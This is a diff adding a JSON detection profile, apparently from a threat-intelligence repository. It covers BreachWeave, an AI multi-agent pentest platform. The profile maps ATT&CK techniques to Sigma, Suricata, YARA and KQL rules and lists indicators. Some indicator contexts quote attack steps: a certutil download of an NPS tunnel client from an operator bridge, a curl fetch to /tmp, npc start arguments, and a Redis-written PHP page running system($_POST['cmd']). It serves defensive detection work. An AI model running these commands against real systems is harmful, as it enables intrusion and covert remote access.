@@ -1,0 +1,425 @@
+{
+  "slug": "breachweave",
+  "name": "BreachWeave",
+  "description": "Multi-agent pentest platform from Chinese automated-attack contests, with Kali solver containers and NPS tunnel hand-off",
+  "seenIn": "No public report of use in an attack. Covered from its source code",
+  "counts": {
+    "kqlHunts": 4,
+    "analytics": 1,
+    "sigma": 5,
+    "suricata": 22,
+    "yara": 4,
+    "indicators": 37
+  },
+  "techniques": [
+    {
+      "id": "T1047",
+      "score": 2,
+      "comment": "KQL hunt: NPS client staged on a host the way BreachWeave's skills tell the solver to; Sigma: BreachWeave Playbook NPS Client Staged on a Host"
+    },
+    {
+      "id": "T1053.005",
+      "score": 1,
+      "comment": "KQL hunt: NPS client staged on a host the way BreachWeave's skills tell the solver to"
+    },
+    {
+      "id": "T1059.004",
+      "score": 1,
+      "comment": "Suricata: 3819321 TD BreachWeave console shell command sent to a solver container"
+    },
+    {
+      "id": "T1071.001",
+      "score": 17,
+      "comment": "KQL hunt: BreachWeave Redis web root pages, NPS client downloads and console calls in web and proxy logs; KQL hunt: Indicator sweep with the agentic watchlist; Sigma: BreachWeave NPS Client Download or Console Event Stream in Proxy Logs; Suricata: 3819301 TD BreachWeave web console page (tch-agent title, main branch); Suricata: 3819302 TD BreachWeave web console page (BreachWeave title, pentest branch); Suricata: 3819303 TD BreachWeave web console inline script (__tchResizeObserverPatched); Suricata: 3819304 TD BreachWeave console runtime status answer; Suricata: 3819305 TD BreachWeave console"
+    },
+    {
+      "id": "T1078",
+      "score": 1,
+      "comment": "Suricata: 3819308 TD BreachWeave console login or self-registration answer with a token (pentest branch)"
+    },
+    {
+      "id": "T1105",
+      "score": 7,
+      "comment": "KQL hunt: BreachWeave Redis web root pages, NPS client downloads and console calls in web and proxy logs; KQL hunt: Indicator sweep with the agentic watchlist; KQL hunt: NPS client staged on a host the way BreachWeave's skills tell the solver to; Sigma: BreachWeave NPS Client Download or Console Event Stream in Proxy Logs; Sigma: BreachWeave Playbook NPS Client Staged on a Host; Suricata: 3819319 TD BreachWeave NPS client download from a bridge (/files/nps/npc_); Suricata: 3819320 TD BreachWeave NPS client download from a bridge (/files/npc)"
+    },
+    {
+      "id": "T1190",
+      "score": 2,
+      "comment": "Sigma: BreachWeave Redis Web Root Pages Requested; Suricata: 3819316 TD BreachWeave Redis web root canary POST (cmd=RCOK)"
+    },
+    {
+      "id": "T1219",
+      "score": 1,
+      "comment": "Sentinel analytics: BreachWeave playbook NPS client staged on a host"
+    },
+    {
+      "id": "T1505.003",
+      "score": 6,
+      "comment": "KQL hunt: BreachWeave Redis web root pages, NPS client downloads and console calls in web and proxy logs; Sigma: BreachWeave Redis Web Root Pages Requested; Suricata: 3819316 TD BreachWeave Redis web root canary POST (cmd=RCOK); Suricata: 3819317 TD BreachWeave Redis web root page request (redis_test, redis_diag, redis_exec, redis_echo); Suricata: 3819318 TD BreachWeave PHP diagnostic page answer (DIAG_START, disable_functions, com_loaded); YARA: BreachWeave_Redis_Webroot_Pages"
+    },
+    {
+      "id": "T1552",
+      "score": 1,
+      "comment": "Suricata: 3819306 TD BreachWeave console provider list with plaintext model API keys"
+    },
+    {
+      "id": "T1552.001",
+      "score": 2,
+      "comment": "Sigma: BreachWeave (tch-agent) Home Folder, Solver State or Crawler Output Written; YARA: BreachWeave_Host_Config_Files"
+    },
+    {
+      "id": "T1572",
+      "score": 3,
+      "comment": "KQL hunt: NPS client staged on a host the way BreachWeave's skills tell the solver to; Sigma: BreachWeave Playbook NPS Client Staged on a Host; Suricata: 3819319 TD BreachWeave NPS client download from a bridge (/files/nps/npc_)"
+    },
+    {
+      "id": "T1588.002",
+      "score": 5,
+      "comment": "KQL hunt: BreachWeave (tch-agent) web console, solver containers or image builds on a host you monitor; Sigma: BreachWeave (tch-agent) Home Folder, Solver State or Crawler Output Written; Sigma: BreachWeave (tch-agent) Web Console, Solver Container or Image Build Started; YARA: BreachWeave_Solver_Image_Dockerfile; YARA: BreachWeave_TchAgent_Binary_Or_Source"
+    },
+    {
+      "id": "T1610",
+      "score": 5,
+      "comment": "KQL hunt: BreachWeave (tch-agent) web console, solver containers or image builds on a host you monitor; Sigma: BreachWeave (tch-agent) Web Console, Solver Container or Image Build Started; Suricata: 3819322 TD BreachWeave console host settings change with container binds; YARA: BreachWeave_Solver_Image_Dockerfile; YARA: BreachWeave_TchAgent_Binary_Or_Source"
+    }
+  ],
+  "indicators": [
+    {
+      "type": "string",
+      "value": "tch-agent by ez team",
+      "confidence": "high",
+      "context": "Description of BreachWeave's tch-agent command line (commander), in the source and the compiled tch-agent binaries",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/apps/cli/src/main.ts#L128",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "<title>tch-agent</title>",
+      "confidence": "high",
+      "context": "Page title of the BreachWeave web console on the main branch (Bun.serve, 127.0.0.1:3000 by default, no authentication)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/ui-web/src/index.html#L6",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "<title>BreachWeave</title>",
+      "confidence": "high",
+      "context": "Page title of the BreachWeave web console on the pentest branch (JWT login, open self-registration by default)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/6957a55f15e0d585f4b728c831021a34f7e02891/packages/ui-web/src/index.html#L6",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "__tchResizeObserverPatched",
+      "confidence": "high",
+      "context": "Inline script marker in the BreachWeave console page on the pentest branch (window.__tchResizeObserverPatched)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/6957a55f15e0d585f4b728c831021a34f7e02891/packages/ui-web/src/index.html#L18",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "docker_image",
+      "value": "tch-agent:latest",
+      "confidence": "medium",
+      "context": "BreachWeave solver image, built locally with docker buildx from ~/.tch-agent/runtime/Dockerfile (Kali base); not published to a registry",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/runtime/runtime.ts#L216",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "ai.tch-agent.dockerfile-sha256",
+      "confidence": "high",
+      "context": "Docker label BreachWeave puts on its solver image (docker buildx build --label ai.tch-agent.dockerfile-sha256=<hash>)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/runtime/helpers.ts#L10",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "tch-solver-",
+      "confidence": "medium",
+      "context": "Name prefix of BreachWeave solver containers (docker run --name tch-solver-<8 hex>)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/runtime/runtime.ts#L34",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "file_path",
+      "value": "/opt/tch-agent/tch-agent",
+      "confidence": "high",
+      "context": "Path the host's tch-agent binary is mounted at inside every BreachWeave solver container; the container runs /opt/tch-agent/tch-agent solver rpc",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/runtime/helpers.ts#L179",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "file_path",
+      "value": ".tch-agent/config/",
+      "confidence": "high",
+      "context": "BreachWeave configuration folder under the user's home: auth.json, models.json, provider-prefs.json (model API keys in clear), settings.json, users.json on the pentest branch",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/index.ts#L235",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "file_path",
+      "value": ".tch-agent/solvers/",
+      "confidence": "high",
+      "context": "BreachWeave per-solver state under the user's home: startup.json, session/, workspace/ (bound into the container at /runtime and /root/workspace)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/runtime/types.ts#L8",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "file_name",
+      "value": "tch-agent-linux-x64",
+      "confidence": "high",
+      "context": "Compiled BreachWeave binary (bun build --compile); also written to ~/.tch-agent/runtime/self/ and mounted into solver containers",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/runtime/helpers.ts#L131",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "file_name",
+      "value": "tch-agent-darwin-arm64",
+      "confidence": "medium",
+      "context": "Compiled BreachWeave binary for macOS arm64 (bun run build)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/package.json#L21",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "file_name",
+      "value": "tch-agent-windows-x64.exe",
+      "confidence": "medium",
+      "context": "Compiled BreachWeave binary for Windows (bun run build)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/package.json#L23",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "file_name",
+      "value": "THIS_IS_DOCKER_CONTAINER_NOT_TARGET_MACHINE.txt",
+      "confidence": "high",
+      "context": "Marker file the BreachWeave solver image creates in /root",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/runtime/assets/Dockerfile#L198",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "file_path",
+      "value": ".tch-networks-output/",
+      "confidence": "medium",
+      "context": "Output folder of the tch-headless crawler that BreachWeave's tch-headless-skill runs (<host>_<port>/<METHOD>_<name>.raw); the crawler binary is not in the repository",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/skills/builtin/tch-headless-skill/SKILL.md#L46",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "TCH_SOLVER_WORKSPACE",
+      "confidence": "medium",
+      "context": "Environment variable BreachWeave passes to each solver (--env TCH_SOLVER_WORKSPACE=/root/workspace) and to subagents",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/runtime/runtime.ts#L533",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "TCH_CHALLENGE_AGENT_TOKEN",
+      "confidence": "medium",
+      "context": "Environment variable that carries the challenge platform Agent-Token into BreachWeave solvers",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/challenge/env.ts#L4",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "http_header",
+      "value": "Agent-Token",
+      "confidence": "low",
+      "context": "Header BreachWeave's challenge client sends to the Tencent Cloud Hackathon platform API (/api/challenges, /api/start_challenge, /api/submit, /api/hint); the platform's protocol, so other teams' agents send it too",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/challenge/api-client.ts#L139",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "uri_string",
+      "value": "/api/start_challenge",
+      "confidence": "low",
+      "context": "Challenge platform call BreachWeave's client makes (POST with Agent-Token); the platform's protocol, shared by any contest agent",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/challenge/api-client.ts#L109",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "uri_string",
+      "value": "/api/config/providers",
+      "confidence": "low",
+      "context": "BreachWeave console route that returns stored model providers with apiKey in clear (no authentication on main)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/ui-web/src/server.ts#L425",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "uri_string",
+      "value": "/api/runtime/solvers",
+      "confidence": "low",
+      "context": "BreachWeave console route that lists and starts solver containers (POST with promptName, task and env)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/ui-web/src/server.ts#L969",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "uri_string",
+      "value": "/api/auth/settings",
+      "confidence": "low",
+      "context": "BreachWeave console route on the pentest branch that answers {\"registrationEnabled\":true} without authentication",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/6957a55f15e0d585f4b728c831021a34f7e02891/packages/ui-web/src/server.ts#L504",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "{\"registrationEnabled\":true}",
+      "confidence": "low",
+      "context": "Unauthenticated answer of /api/auth/settings on a BreachWeave pentest-branch console with the default open self-registration",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/6957a55f15e0d585f4b728c831021a34f7e02891/packages/core/src/config/index.ts#L1202",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "security_kimi_search",
+      "confidence": "medium",
+      "context": "Name of BreachWeave's Kimi plus Qwen web search tool, sent in the tool list of its model requests",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/tools/security-kimi-search.ts#L572",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "你是网络安全领域的智能搜索助手，服务于已授权的 CTF 与渗透测试场景。",
+      "confidence": "medium",
+      "context": "First line of the system prompt BreachWeave's security_kimi_search tool sends to Kimi and Qwen (raw UTF-8 in the JSON body)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/tools/security-kimi-search.ts#L91",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "你是 CTF 解题 Agent 的 observer sidecar。",
+      "confidence": "high",
+      "context": "First line of the system prompt of BreachWeave's observer agent, sent to the model provider",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/solver/extension/challenge-observer/observer-agent.ts#L11",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "Tencent Cloud Hackathon - Smart Penetration Challenge",
+      "confidence": "medium",
+      "context": "Text in BreachWeave's built-in kimi-security solver prompt, sent to the model provider",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/prompts/builtin/kimi-security.md#L34",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "uri_string",
+      "value": "/redis_diag.php",
+      "confidence": "medium",
+      "context": "Diagnostic page BreachWeave's redis-webroot-rce skill writes into a web root through Redis; it prints DIAG_START and the PHP disable_functions list",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/skills/builtin/redis-webroot-rce/SKILL.md#L99",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "uri_string",
+      "value": "/redis_exec.php",
+      "confidence": "medium",
+      "context": "Command page BreachWeave's redis-webroot-rce skill writes into a web root through Redis (system($_POST['cmd']))",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/skills/builtin/redis-webroot-rce/SKILL.md#L127",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "uri_string",
+      "value": "/redis_test.php",
+      "confidence": "low",
+      "context": "First check page BreachWeave's redis-webroot-rce skill writes into a web root through Redis, then POSTs cmd=RCOK to it",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/skills/builtin/redis-webroot-rce/SKILL.md#L77",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "cmd=RCOK",
+      "confidence": "medium",
+      "context": "POST body BreachWeave's redis-webroot-rce and intranet-pentest skills send to the page written through Redis to confirm PHP runs",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/skills/builtin/redis-webroot-rce/SKILL.md#L80",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "uri_string",
+      "value": "/files/nps/npc_windows_amd64.exe",
+      "confidence": "medium",
+      "context": "Path BreachWeave's skills fetch the NPS client from on the operator's bridge (certutil -urlcache -split -f http://<bridge>:44944/files/nps/npc_windows_amd64.exe C:\\Users\\Public\\npc.exe)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/skills/builtin/redis-webroot-rce/SKILL.md#L147",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "uri_string",
+      "value": "/files/nps/npc_linux_amd64",
+      "confidence": "medium",
+      "context": "Path BreachWeave's known-product-exploit skill fetches the Linux NPS client from on the operator's bridge (curl -o /tmp/npc)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/skills/builtin/known-product-exploit/SKILL.md#L153",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "string",
+      "value": "-vkey=auto",
+      "confidence": "medium",
+      "context": "NPS client argument in every npc start command in BreachWeave's skills (-server=<bridge>:44944 or :8024 -vkey=auto)",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/skills/builtin/redis-webroot-rce/SKILL.md#L148",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "port",
+      "value": "44944",
+      "confidence": "low",
+      "context": "Port of the operator bridge in BreachWeave's skills: NPS file downloads (/files/...) and cascaded npc connections",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/skills/builtin/intranet-pentest/SKILL.md#L416",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "url",
+      "value": "https://open.bigmodel.cn/api/coding/paas/v4",
+      "confidence": "low",
+      "context": "Zhipu GLM coding endpoint BreachWeave registers as its one custom model provider (zhipuai, glm-4.5); a public model API used by many tools",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/config/providers/zhipuai.ts#L11",
+      "reported": "2026-10-09"
+    },
+    {
+      "type": "domain",
+      "value": "mirrors.ustc.edu.cn",
+      "confidence": "low",
+      "context": "Kali package mirror BreachWeave's solver image build uses by default (KALI_MIRROR); a public university mirror used by many",
+      "source": "ThreatDefence review of the BreachWeave source code",
+      "sourceUrl": "https://github.com/m-sec-org/BreachWeave/blob/bc2d9502a2625c5ef354adc30243bd091341cc51/packages/core/src/runtime/assets/Dockerfile#L3",
+      "reported": "2026-10-09"
+    }
+  ],
+  "indicatorsTruncated": false,
+  "upstreamUrl": "https://github.com/ThreatDefence/agentic-attack-detections/tree/main/frameworks/breachweave",
+  "source": "github.com/ThreatDefence/agentic-attack-detections",
+  "license": "MIT"
+}
